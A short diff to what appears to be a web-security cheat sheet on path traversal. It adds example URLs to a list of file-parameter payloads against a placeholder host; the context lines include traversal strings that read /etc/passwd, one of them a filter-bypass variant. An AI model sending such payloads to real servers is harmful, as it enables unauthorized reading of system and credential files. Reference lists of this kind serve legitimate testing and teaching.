@@ -8,6 +8,8 @@ render_with_liquid: false
 ---
 
 ```
+https://vulnerable.com/image?file=index.php
+https://vulnerable.com/image?file=index.html
 https://vulnerable.com/image?file=/etc/passwd
 https://vulnerable.com/image?file=../../../etc/passwd
 https://vulnerable.com/image?file=....//....//....//etc/passwd
